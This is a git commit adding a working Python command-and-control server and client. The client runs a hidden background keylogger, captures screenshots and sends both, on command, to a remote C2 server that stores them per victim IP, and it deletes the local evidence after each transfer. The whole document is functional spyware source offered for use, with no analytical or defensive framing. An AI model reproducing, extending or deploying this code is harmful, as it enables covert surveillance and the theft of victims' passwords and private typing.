44fbe615b13e9c28af8bc8775d88e7f2e8576a80
Austin Winans <109684060+austinwinans@users.noreply.github.com>
2023-07-28 17:23:10 -0400

    Add files via upload
    Working client and c2 server with the ability to save screenshots and pull log files

---
+++ c2.py
@@ -0,0 +1,116 @@
+import socket
+from PIL import Image
+import io
+import os
+from datetime import datetime
+
+def take_screenshot(client_socket, client_address):
+    folder_name = f"{client_address[0]}_screenshots"
+    if not os.path.exists(folder_name):
+        os.makedirs(folder_name)
+
+    size_data = client_socket.recv(10).decode('utf-8')
+    size = int(size_data)
+    print(f"Receiving screenshot data of size: {size}")
+
+    received_data = b""
+    while len(received_data) < size:
+        data = client_socket.recv(size - len(received_data))
+        if not data:
+            break
+        received_data += data
+
+    if len(received_data) == size:
+        print("Screenshot data received successfully.")
+        try:
+            now = datetime.now()
+            timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
+            file_name = f"{folder_name}/screenshot_{timestamp}.png"
+            img = Image.open(io.BytesIO(received_data))
+            img.save(file_name)
+            print(f"Screenshot saved successfully to {file_name}.")
+        except Exception as e:
+            print(f"Failed to save screenshot - {e}")
+    else:
+        print("Failed to receive complete screenshot data.")
+
+def save_keylogs(client_socket, client_address):
+    folder_name = f"{client_address[0]}_keylogs"
+    if not os.path.exists(folder_name):
+        os.makedirs(folder_name)
+
+    now = datetime.now()
+    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
+    file_name = f"{folder_name}/keylogs_{timestamp}.txt"
+
+    size_data = client_socket.recv(10).decode('utf-8')
+    size = int(size_data)
+    print(f"Receiving key logs data of size: {size}")
+
+    received_data = b""
+    while len(received_data) < size:
+        data = client_socket.recv(size - len(received_data))
+        if not data:
+            break
+        received_data += data
+
+    if len(received_data) == size:
+        print("Key logs data received successfully.")
+        try:
+            with open(file_name, "wb") as f:
+                f.write(received_data)
+            print(f"Key logs saved successfully to {file_name}.")
+        except Exception as e:
+            print(f"Failed to save key logs - {e}")
+    else:
+        print("Failed to receive complete key logs data.")
+
+def start_server(host, port):
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((host, port))
+    server_socket.listen(1)
+    print('Waiting For Connection...')
+    (client_socket, client_address) = server_socket.accept()
+    print('Connected to: ', client_address[0])
+
+    try:
+        while True:
+            command = input("Enter a command ('screenshot [ip]', 'logs [ip]', 'exit'): ")
+
+            if command.startswith("screenshot"):
+                try:
+                    _, ip = command.split()
+                    if ip == client_address[0]:
+                        client_socket.sendall(b"screenshot")
+                        take_screenshot(client_socket, client_address)
+                    else:
+                        print(f"Client with IP {ip} not found.")
+                except ValueError:
+                    print("Please enter an IP address after 'screenshot' command.")
+
+            elif command.startswith("logs"):
+                try:
+                    _, ip = command.split()
+                    if ip == client_address[0]:
+                        client_socket.sendall(b"logs")
+                        save_keylogs(client_socket, client_address)
+                    else:
+                        print(f"Client with IP {ip} not found.")
+                except ValueError:
+                    print("Please enter an IP address after 'logs' command.")
+
+            elif command == "exit":
+                break
+            else:
+                print("Invalid command.")
+
+    except Exception as e:
+        print(f"Error occurred - {e}")
+
+    print("Connection closed.")
+    client_socket.close()
+
+if __name__ == "__main__":
+    host = '0.0.0.0'  # Listen on all available network interfaces
+    port = 1112       # Use the same port number as the client
+    start_server(host, port)
---
+++ client.py
@@ -0,0 +1,89 @@
+from PIL import ImageGrab
+import socket
+import os
+import threading
+from pynput import keyboard
+
+def take_screenshot():
+    img = ImageGrab.grab()
+    img.save("screenshot.png")
+
+def connect_to_server(host, port):
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect((host, port))
+    return client_socket
+
+def on_press(key):
+    try:
+        with open("keylogs.txt", "a") as f:
+            f.write(str(key.char))
+    except AttributeError:
+        if key == keyboard.Key.space:
+            with open("keylogs.txt", "a") as f:
+                f.write(" ")
+        elif key == keyboard.Key.enter:
+            with open("keylogs.txt", "a") as f:
+                f.write("\n")
+
+def main():
+    host = '127.0.0.1'  # Replace with the IP address of your C2 server
+    port = 1112         # Use the same port number as the C2 server
+
+    # Create keylogs.txt if it doesn't exist
+    if not os.path.exists("keylogs.txt"):
+        with open("keylogs.txt", "w") as f:
+            pass
+
+    client_socket = connect_to_server(host, port)
+    print(f"Connected to the server: {host}:{port}")
+
+    # Start keylogger thread
+    keylogger_thread = threading.Thread(target=keyboard.Listener(on_press=on_press).start)
+    keylogger_thread.daemon = True  # Set the thread as daemon to run in the background
+    keylogger_thread.start()
+
+    try:
+        while True:
+            command = client_socket.recv(1024).decode().strip()
+
+            if not command:
+                continue
+
+            print(f"Received command: {command}")
+
+            if command == "screenshot":
+                print("Taking screenshot...")
+                take_screenshot()
+                print("Sending screenshot data...")
+                with open("screenshot.png", "rb") as f:
+                    screenshot_data = f.read()
+                    size = len(screenshot_data)
+                    client_socket.sendall(bytes(str(size), 'utf-8'))
+                    client_socket.sendall(screenshot_data)
+                print("Screenshot data sent successfully.")
+                os.remove("screenshot.png")  # Delete the screenshot after sending
+
+            elif command == "logs":
+                print("Sending key logs...")
+                with open("keylogs.txt", "rb") as f:
+                    logs_data = f.read()
+                    size = len(logs_data)
+                    client_socket.sendall(bytes(str(size), 'utf-8'))
+                    client_socket.sendall(logs_data)
+                print("Key logs sent successfully.")
+                # Optional: Delete the keylogs file after sending
+                os.remove("keylogs.txt")
+
+            elif command == "exit":
+                break
+            else:
+                print("Invalid command.")
+
+    except Exception as e:
+        print(f"Error occurred - {e}")
+
+    print("Connection closed.")
+    client_socket.close()
+
+if __name__ == "__main__":
+    main()
